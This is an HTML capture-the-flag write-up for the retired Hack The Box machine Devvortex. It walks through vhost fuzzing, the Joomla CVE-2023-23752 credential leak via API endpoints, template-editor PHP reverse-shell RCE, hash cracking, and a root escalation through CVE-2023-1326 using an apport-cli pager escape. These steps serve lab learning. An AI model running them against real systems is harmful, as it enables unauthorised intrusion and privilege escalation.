@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Devvortex &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge htb">HTB</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Devvortex</h1>
+    
+    <div class="tags"><span class="tag">Linux</span><span class="tag">Joomla</span><span class="tag">CVE</span><span class="tag">subdomainenum</span><span class="tag">ffuf</span><span class="tag">MySQL</span><span class="tag">john</span><span class="tag">apport</span><span class="tag">GTFOBins</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#cve-2023-23752-joomla-admin-rce">CVE-2023-23752 → Joomla Admin → RCE</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#mysql-hashes-logan">MySQL Hashes → logan</a><a class="lvl3" href="#cve-2023-1326-apport-cli-sudo">CVE-2023-1326, apport-cli sudo</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Devvortex is an easy Linux box that starts with subdomain discovery and a Joomla information-disclosure CVE. <strong>CVE-2023-23752</strong> leaks Joomla's configured database credentials through an unauthenticated API endpoint; those log into the admin panel, where the template editor gives PHP RCE. After cracking a database hash to move to a real user, root comes from <strong>CVE-2023-1326</strong> in <code>apport-cli</code>, a <code>less</code> pager escape.</p>
+<h2 id="recon">Recon</h2>
+<p>The apex redirects to <code>devvortex.htb</code>. Fuzzing for vhosts revealed a dev subdomain:</p>
+<pre><code class="language-sh">ffuf -u http://10.129.19.169 -H 'Host: FUZZ.devvortex.htb' -w subdomains-top1million-110000.txt -mc all -ac
+-&gt;  dev.devvortex.htb
+</code></pre>
+<p><code>/administrator</code> on that subdomain is a <strong>Joomla</strong> login. The version is readable from a manifest, a Joomla classic:</p>
+<pre><code>/administrator/manifests/files/joomla.xml   -&gt;   4.2.6
+</code></pre>
+<h2 id="foothold">Foothold</h2>
+<h3 id="cve-2023-23752-joomla-admin-rce">CVE-2023-23752 → Joomla Admin → RCE</h3>
+<blockquote>
+<p><strong>The bug:</strong> Joomla 4.x exposed its REST API without proper auth checks on certain endpoints. <code>?public=true</code> on the config and users endpoints dumps usernames and, critically, the database connection settings, including the password.</p>
+</blockquote>
+<pre><code>/api/index.php/v1/users?public=true            -&gt;  logan, lewis
+/api/index.php/v1/config/application?public=true -&gt;  password: ‹redacted›
+</code></pre>
+<p>That password logged in as the super-user <code>lewis</code>. With super-user access, Joomla's template editor is RCE-by-design, I edited <code>error.php</code> to a PHP reverse shell and triggered it:</p>
+<pre><code>http://dev.devvortex.htb/templates/cassiopeia/error.php
+</code></pre>
+<pre><code class="language-sh">rlwrap nc -lvnp 53
+www-data@devvortex:/$ whoami
+www-data
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="mysql-hashes-logan">MySQL Hashes → logan</h3>
+<p>The leaked credentials also worked for MySQL locally. Dumping the Joomla users table gave two bcrypt hashes; <code>logan</code>'s cracked:</p>
+<pre><code class="language-sql">select * from sd4fg_users;
+-- lewis / logan bcrypt hashes
+</code></pre>
+<pre><code class="language-sh">john hash --wordlist=rockyou.txt   -&gt;   logan : ‹redacted›
+su logan
+</code></pre>
+<h3 id="cve-2023-1326-apport-cli-sudo">CVE-2023-1326, apport-cli sudo</h3>
+<pre><code class="language-sh">sudo -l
+User logan may run the following commands:
+    (ALL : ALL) /usr/bin/apport-cli
+</code></pre>
+<blockquote>
+<p><strong>Why this is root:</strong> <code>apport-cli</code> pipes its crash report through a pager (<code>less</code>). When run as root via sudo, that pager runs as root too. <code>less</code> has a documented shell escape (<code>!cmd</code>). So I just need a crash file to feed it.</p>
+</blockquote>
+<p>I forced a crash to generate the report, then opened it through the privileged <code>apport-cli</code> and escaped the pager:</p>
+<pre><code class="language-sh">sleep 20 &amp; kill -ABRT $!            # creates /var/crash/_usr_bin_sleep.*.crash
+sudo apport-cli -c /var/crash/_usr_bin_sleep.1000.crash
+# choose V (view) -&gt; opens less -&gt; type:
+!/bin/bash
+</code></pre>
+<h2 id="root">Root</h2>
+<pre><code class="language-sh">root@devvortex:/tmp# whoami
+root
+</code></pre>
+<p>Box rooted.</p>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Always fuzz for vhosts</strong>, the vulnerable Joomla lived on <code>dev.</code></li>
+<li><strong>CVE-2023-23752 leaks DB creds pre-auth</strong>, and a Joomla super-user equals RCE via templates.</li>
+<li><strong>Pager-based sudo tools (<code>apport-cli</code>, anything wrapping <code>less</code>/<code>more</code>) are escapable.</strong> The <code>!cmd</code> escape turns a "view report" prompt into a root shell.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
